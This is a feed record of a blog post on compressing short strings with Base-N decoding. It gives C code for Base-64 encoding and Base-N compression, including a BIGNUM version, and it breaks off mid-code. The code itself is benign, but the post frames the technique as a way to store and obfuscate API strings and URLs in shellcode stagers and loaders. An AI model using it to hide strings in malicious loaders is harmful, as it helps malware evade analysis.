{
    "articles": [
        {
            "title": "Shellcode: Base-N Decoding for Text-Only Compression and Obfuscation",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Shellcode: Base-N Decoding for Text-Only Compression and Obfuscation"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2022/08/22/base_n_compression/"
                }
            ],
            "link": "https://modexp.wordpress.com/2022/08/22/base_n_compression/",
            "comments": "https://modexp.wordpress.com/2022/08/22/base_n_compression/#respond",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Mon, 22 Aug 2022 01:00:00 +0000",
            "published_parsed": [
                2022,
                8,
                22,
                1,
                0,
                0,
                0,
                234,
                0
            ],
            "tags": [
                {
                    "term": "compression",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "openssl",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "programming",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shellcode",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "base-n encoding",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "bignum",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shoco",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "smaz",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "unishox2",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=5210",
            "guidislink": false,
            "summary": "Introduction Concise Binary Object Representation (CBOR), the binary equivalent to JavaScript Object Notation (JSON), is ideal for storing a configuration to a shellcode/stager/loader. I&#8217;ve always wanted support for text-only compression to store API strings and URLs. CBOR currently doesn&#8217;t support &#8230; <a href=\"https://modexp.wordpress.com/2022/08/22/base_n_compression/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Introduction Concise Binary Object Representation (CBOR), the binary equivalent to JavaScript Object Notation (JSON), is ideal for storing a configuration to a shellcode/stager/loader. I&#8217;ve always wanted support for text-only compression to store API strings and URLs. CBOR currently doesn&#8217;t support &#8230; <a href=\"https://modexp.wordpress.com/2022/08/22/base_n_compression/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
                    "value": "<h2>Introduction</h2>\n\n<p><a href=\"https://cbor.io/\">Concise Binary Object Representation (CBOR)</a>, the binary equivalent to JavaScript Object Notation (JSON), is ideal for storing a configuration to a shellcode/stager/loader. I&#8217;ve always wanted support for text-only compression to store API strings and URLs. CBOR currently doesn&#8217;t support compression, and while Zlib is recommended quite a lot for JSON, it wasn&#8217;t designed for short strings/input. A format like CBOR would benefit by supporting text-only compression, encryption and masking natively. In the meantime, however, developers are responsible for implementing those features independently.</p>\n\n<p>Before we cover Base-N decoding, we should talk about some well-known compression algorithms and why they&#8217;re unsuitable for short inputs. Huffman encoding, for example, is a lossless compression method that assigns shorter bit strings to a range of bytes. The most frequently used bytes are assigned the least amount of bits, helping reduce the size of the original input. Recovering the original data requires the same bit-to-byte mappings used during encoding. These mappings, also known as &#8220;Huffman tables&#8221;, are stored with compressed data and can sometimes require more space than the input itself.</p>\n\n<p>LZ encoding also isn&#8217;t suitable since it works by storing full strings or a &#8220;match reference&#8221; that consists of an offset and length to the same range of bytes found earlier. Zlib and LZMA are excellent compression algorithms, but are obviously designed specifically for large data blocks rather than short strings.</p>\n\n<p>In this blog post, we&#8217;ll examine how effective it is to use Base-N decoding for text-only compression. It&#8217;s similar to Huffman encoding, but without the need for Huffman tables. The results will be compared with some of the following projects designed for compressing short strings:</p>\n\n<ul>\n    <li><a href=\"https://github.com/antirez/smaz\">SMAZ: compression for very small strings</a></li>\n    <li><a href=\"https://ed-von-schleck.github.io/shoco/\">shoco: a fast compressor for short strings</a></li>\n    <li><a href=\"https://github.com/siara-cc/Unishox2\">Unishox2: Compression for Unicode short strings </a></li>\n    <li><a href=\"https://github.com/jstepien/skrot\">Skrot: A customisable compression utility dedicated to short inputs.</a></li>\n</ul>\n\n<p>UniShox2 is considered the best of all and uses a combination of three encoding methods:</p>\n\n    <ul>\n        <li>Entropy coding (Huffman, Arithmetic)</li> \n        <li>Dictionary coder (LZ77,LZ78,LZW)</li> \n        <li>Delta encoding</li> \n    </ul>\n    \n<h2>Applications</h2>\n\n<p>In case you&#8217;re wondering why on earth compressing short strings would be useful, I&#8217;ve copied the following list of applications from the UniShox2 repository for you to consider.</p>\n\n<ul>\n    <li>Compression for low memory devices such as Arduino and ESP8266</li>\n    <li>Sending messages over Websockets</li>\n    <li>Compression of Chat application text exchange including Emojis</li>\n    <li>Storing compressed text in databases</li>\n    <li>Faster retrieval speed when used as join keys</li>\n    <li>Bandwidth cost saving for messages transferred to and from Cloud infrastructure</li>\n    <li>Storage cost reduction for Cloud databases</li>\n    <li>Some people even use it for obfuscation</li>\n</ul>\n\n<h2>Base-64 Encoding</h2>\n\n<p>I&#8217;ll assume most of you are familiar with <a href=\"https://www.rfc-editor.org/rfc/rfc4648\">Base-64</a> encoding, but not necessarily how it works internally. It&#8217;s a binary-to-text encoding scheme that converts 24-bits of binary to a 32-bit string. It uses 8-Bit ASCII characters to store 6-Bits of binary, which increases the data by approx. 33%. For example, encoding 32 bytes of binary would require 44 bytes of space for the encoded string. To calculate the necessary space, we divide the length of the binary by three and multiply by four. Taking into account any padding, we then align up by four. In C, we can use something like the following:</p>\n\n<pre style=\"color: #000000; background: #ffffff;\">uint32_t OutLength <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #008c00;\">4</span> <span style=\"color: #808030;\">*</span> <span style=\"color: #808030;\">(</span>InLength <span style=\"color: #808030;\">/</span> <span style=\"color: #008c00;\">3</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">3</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">&amp;</span> <span style=\"color: #808030;\">-</span><span style=\"color: #008c00;\">4</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">.</span>\n</pre>\n<!--Created using ToHtml.com on 2022-08-21 22:16:51 UTC -->\n\n<p>The following is Base-64 encoding without using a lookup table.</p>\n\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> ROTL32</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">v</span><span style=\"color: #808030;\">,</span><span style=\"color: #004a43;\">n</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">v</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">n</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">|</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">v</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">32</span><span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">n</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span>\n\n<span style=\"color: #800000; font-weight: bold;\">void</span>\nbase64_encode<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">void</span> <span style=\"color: #808030;\">*</span>inbuf<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">int</span> inlen<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">char</span> <span style=\"color: #808030;\">*</span>outbuf<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    uint8_t  <span style=\"color: #808030;\">*</span>in <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>uint8_t<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>inbuf<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">char</span>     <span style=\"color: #808030;\">*</span>out <span style=\"color: #808030;\">=</span> outbuf<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">int</span>      i<span style=\"color: #800080;\">;</span>\n    uint32_t len=0<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #800000; font-weight: bold;\">while</span> <span style=\"color: #808030;\">(</span>inlen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        uint32_t x <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n        uint8_t c<span style=\"color: #800080;\">;</span>\n        <span style=\"color: #696969;\">// read 3 or less bytes. if required, pad with zeros</span>\n        <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span>len<span style=\"color: #808030;\">=</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span><span style=\"color: #008c00;\">3</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n            x <span style=\"color: #808030;\">|</span><span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>i <span style=\"color: #808030;\">&lt;</span> inlen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">?</span> in<span style=\"color: #808030;\">[</span>len<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">]</span> <span style=\"color: #800080;\">:</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n            x <span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800080;\">}</span>\n        in <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> len<span style=\"color: #800080;\">;</span>\n        inlen <span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">=</span> len<span style=\"color: #800080;\">;</span>\n        len <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>len <span style=\"color: #808030;\">*</span> <span style=\"color: #008c00;\">8</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">4</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">/</span> <span style=\"color: #008c00;\">6</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #696969;\">// encode len bytes.</span>\n        <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>len<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n            x <span style=\"color: #808030;\">=</span> ROTL32<span style=\"color: #808030;\">(</span>x<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">6</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n            c <span style=\"color: #808030;\">=</span> x <span style=\"color: #808030;\">%</span> <span style=\"color: #008c00;\">64</span><span style=\"color: #800080;\">;</span>\n            <span style=\"color: #800000; font-weight: bold;\">if</span> <span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">26</span><span style=\"color: #808030;\">)</span> c <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> <span style=\"color: #0000e6;\">'A'</span><span style=\"color: #800080;\">;</span>\n            <span style=\"color: #800000; font-weight: bold;\">else</span> <span style=\"color: #800000; font-weight: bold;\">if</span> <span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">52</span><span style=\"color: #808030;\">)</span> c <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">-</span> <span style=\"color: #008c00;\">26</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #0000e6;\">'a'</span><span style=\"color: #800080;\">;</span>\n            <span style=\"color: #800000; font-weight: bold;\">else</span> <span style=\"color: #800000; font-weight: bold;\">if</span> <span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">62</span><span style=\"color: #808030;\">)</span> c <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">-</span> <span style=\"color: #008c00;\">52</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #0000e6;\">'0'</span><span style=\"color: #800080;\">;</span>\n            <span style=\"color: #800000; font-weight: bold;\">else</span> <span style=\"color: #800000; font-weight: bold;\">if</span> <span style=\"color: #808030;\">(</span>c <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">63</span><span style=\"color: #808030;\">)</span> c <span style=\"color: #808030;\">=</span> <span style=\"color: #0000e6;\">'+'</span><span style=\"color: #800080;\">;</span>\n            <span style=\"color: #800000; font-weight: bold;\">else</span> c <span style=\"color: #808030;\">=</span> <span style=\"color: #0000e6;\">'/'</span><span style=\"color: #800080;\">;</span>\n            <span style=\"color: #808030;\">*</span>out<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span> <span style=\"color: #808030;\">=</span> c<span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #696969;\">// if required, add padding.</span>\n    <span style=\"color: #800000; font-weight: bold;\">while</span> <span style=\"color: #808030;\">(</span>len<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span> <span style=\"color: #808030;\">&lt;</span> <span style=\"color: #008c00;\">4</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">*</span>out<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #0000e6;\">'='</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #808030;\">*</span>out <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<!--Created using ToHtml.com on 2022-08-21 22:15:55 UTC -->\n\n<h2>Base-N Decoding</h2>\n\n<p>Since Base-64 encoding will increase the original data by 33%, what prevents us from using Base-64 decoding to reduce the size of arbitrary strings by 25%? The compression ratio upon conversion to binary entirely depends on what characters the string contains, so you&#8217;ll get different results depending on the input. However, decoding should always result in some compression of the original string. The following table lists the approximate decrease in space used by a string when using various Base-N decoding.</p>\n\n<table class=\"tg\">\n<thead>\n  <tr>\n    <th>Base</th>\n    <th class=\"tg-0lax\">Input</th>\n    <th class=\"tg-0lax\">Alphabet</th>\n    <th>% Decrease</th>\n  </tr>\n</thead>\n<tbody>\n  <tr>\n    <td>2</td>\n    <td class=\"tg-0lax\">64 x &#8220;0&#8221;</td>\n    <td class=\"tg-0lax\">01</td>\n    <td>88</td>\n  </tr>\n  <tr>\n    <td>10</td>\n    <td class=\"tg-0lax\">18446744073709551615</td>\n    <td class=\"tg-0lax\">0123456789</td>\n    <td>50</td>\n  </tr>\n  <tr>\n    <td>16</td>\n    <td class=\"tg-0lax\">FFFFFFFFFFFFFFFF</td>\n    <td class=\"tg-0lax\">0123456789ABCDEF</td>\n    <td>44<br /></td>\n  </tr>\n  <tr>\n    <td>26</td>\n    <td class=\"tg-0lax\">THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG</td>\n    <td class=\"tg-0lax\">ABCDEFGHIJKLMNOPQRSTUVWXYZ<br /></td>\n    <td>40</td>\n  </tr>\n  <tr>\n    <td>36<br /></td>\n    <td class=\"tg-0lax\">THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG2</td>\n    <td class=\"tg-0lax\">ABCDEFGHIJKLMNOPQRSTUVWXYZ\n0123456789</td>\n    <td>34</td>\n  </tr>\n  <tr>\n    <td>52</td>\n    <td class=\"tg-0lax\">Thequickbrownfoxjumpsoverthelazydog</td>\n    <td class=\"tg-0lax\">ABCDEFGHIJKLMNOPQRSTUVWXYZ\nabcdefghijklmnopqrstuvwxyz</td>\n    <td>29</td>\n  </tr>\n  <tr>\n    <td>62</td>\n    <td class=\"tg-0lax\">Thequickbrownfoxjumpsoverthelazydog2</td>\n    <td class=\"tg-0lax\">ABCDEFGHIJKLMNOPQRSTUVWXYZ\nabcdefghijklmnopqrstuvwxyz\n0123456789</td>\n    <td>25</td>\n  </tr>\n</tbody>\n</table>\n\n<p></p>As you can see, a higher base number results in a lower compression ratio. And, of course, there are more printable characters required for punctuation, which will only decrease it further. My intention here isn&#8217;t to compete with or replace existing string compression tools. I&#8217;m merely pointing out that anyone can use Base-N decoding to compress strings with little effort. The following code in C can be used as a reference.<p></p>\n\n<h2>Base-N Compression with 64-Bit Integers</h2>\n\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">//</span>\n<span style=\"color: #696969;\">// Compress string using Base-N decoding.</span>\n<span style=\"color: #696969;\">//</span>\nuint64_t\nbase_n_compress<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">char</span> str<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">char</span> base_tbl<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    uint64_t val <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> pwr <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #603000;\">size_t</span> inlen <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">strlen</span><span style=\"color: #808030;\">(</span>str<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">size_t</span> base_n <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">strlen</span><span style=\"color: #808030;\">(</span>base_tbl<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">size_t</span> i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>inlen<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #800000; font-weight: bold;\">const</span> <span style=\"color: #800000; font-weight: bold;\">char</span> <span style=\"color: #808030;\">*</span>ptr <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">strchr</span><span style=\"color: #808030;\">(</span>base_tbl<span style=\"color: #808030;\">,</span> str<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800000; font-weight: bold;\">if</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">!</span>ptr<span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">return</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800000; font-weight: bold;\">int</span> idx <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>ptr <span style=\"color: #808030;\">-</span> base_tbl<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n        val <span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">=</span> pwr <span style=\"color: #808030;\">*</span> idx<span style=\"color: #800080;\">;</span> \n        pwr <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">=</span> base_n<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #800000; font-weight: bold;\">return</span> val<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n\n<span style=\"color: #696969;\">//</span>\n<span style=\"color: #696969;\">// Decompress string using Base-N encoding.</span>\n<span style=\"color: #696969;\">//</span>\n<span style=\"color: #800000; font-weight: bold;\">void</span> \nbase_n_decompress<span style=\"color: #808030;\">(</span>uint64_t val<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">char</span> base_tbl<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">char</span> str<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span> \n    <span style=\"color: #603000;\">size_t</span>   base_n <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">strlen</span><span style=\"color: #808030;\">(</span>base_tbl<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    uint64_t pwr <span style=\"color: #808030;\">=</span> base_n<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">int</span>      outlen<span style=\"color: #808030;\">,</span> i<span style=\"color: #800080;\">;</span>\n    \n    val<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">-</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span>outlen <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span> val <span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">=</span> pwr<span style=\"color: #800080;\">;</span> outlen<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        val <span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">=</span> pwr<span style=\"color: #800080;\">;</span> \n        pwr <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">=</span> base_n<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    str<span style=\"color: #808030;\">[</span>outlen<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span>i <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i <span style=\"color: #808030;\">&lt;</span> outlen<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span> \n        str<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> base_tbl<span style=\"color: #808030;\">[</span>val <span style=\"color: #808030;\">%</span> base_n<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span> \n        val <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">=</span> base_n<span style=\"color: #800080;\">;</span> \n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<!--Created using ToHtml.com on 2022-08-21 21:49:14 UTC -->\n\n<p>The only problem with this code is when the string converted to binary exceeds <img alt=\"2^{64}\" class=\"latex\" src=\"https://s0.wp.com/latex.php?latex=2%5E%7B64%7D&#038;bg=ffffff&#038;fg=333333&#038;s=0&#038;c=20201002\" /> bits. Then we need to use bignum arithmetic. Of course, you won&#8217;t have that problem in some languages that already support multi-precision arithmetic. Getting a Python implementation of the same code without the <img alt=\"2^{64}\" class=\"latex\" src=\"https://s0.wp.com/latex.php?latex=2%5E%7B64%7D&#038;bg=ffffff&#038;fg=333333&#038;s=0&#038;c=20201002\" /> bits limit is relatively simple.</p>\n\n<h2>Base-N Compression with Arbitrary Arithmetic</h2>\n\n<p>There are no limits to string compression once we start using bignum arithmetic. However, it makes more sense to use an algorithm designed specifically for large data blocks at some point. To demonstrate how it works with OpenSSL&#8217;s BIGNUM implementation. The following two functions work well for strings that might exceed <img alt=\"2^{64}\" class=\"latex\" src=\"https://s0.wp.com/latex.php?latex=2%5E%7B64%7D&#038;bg=ffffff&#038;fg=333333&#038;s=0&#038;c=20201002\" /> bits. This code resolves the limitations of the previous code.</p>\n\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">//</span>\n<span style=\"color: #696969;\">// Compress a string using Base-N decoding.</span>\n<span style=\"color: #696969;\">//</span>\n<span style=\"color: #800000; font-weight: bold;\">void</span>\nbase_n_compress<span style=\"color: #808030;\">(</span>BIGNUM <span style=\"color: #808030;\">*</span>val<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">const</span> <span style=\"color: #800000; font-weight: bold;\">char</span> <span style=\"color: #808030;\">*</span>str<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">const</span> <span style=\"color: #800000; font-weight: bold;\">char</span> <span style=\"color: #808030;\">*</span>base_tbl<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">size_t</span> inlen <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">strlen</span><span style=\"color: #808030;\">(</span>str<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BIGNUM <span style=\"color: #808030;\">*</span>pwr <span style=\"color: #808030;\">=</span> BN_new<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BIGNUM <span style=\"color: #808030;\">*</span>tmp <span style=\"color: #808030;\">=</span> BN_new<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BIGNUM <span style=\"color: #808030;\">*</span>base <span style=\"color: #808030;\">=</span> BN_new<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    BN_CTX <span style=\"color: #808030;\">*</span>ctx <span style=\"color: #808030;\">=</span> BN_CTX_new<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    BN_one<span style=\"color: #808030;\">(</span>pwr<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>  <span style=\"color: #696969;\">// pwr = 1</span>\n    BN_set_word<span style=\"color: #808030;\">(</span>base<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">strlen</span><span style=\"color: #808030;\">(</span>base_tbl<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// for each character</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">size_t</span> i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>inlen<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #696969;\">// get index</span>\n        uint8_t idx <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800000; font-weight: bold;\">const</span> <span style=\"color: #800000; font-weight: bold;\">char</span> <span style=\"color: #808030;\">*</span>ptr <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">strchr</span><span style=\"color: #808030;\">(</span>base_tbl<span style=\"color: #808030;\">,</span> str<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800000; font-weight: bold;\">if</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">!</span>ptr<span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">break</span><span style=\"color: #800080;\">;</span>\n        idx <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>uint8_t<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span>ptr <span style=\"color: #808030;\">-</span> base_tbl<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n        \n        BN_set_word<span style=\"color: #808030;\">(</span>tmp<span style=\"color: #808030;\">,</span> idx<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>       <span style=\"color: #696969;\">//</span>\n        BN_mul<span style=\"color: #808030;\">(</span>tmp<span style=\"color: 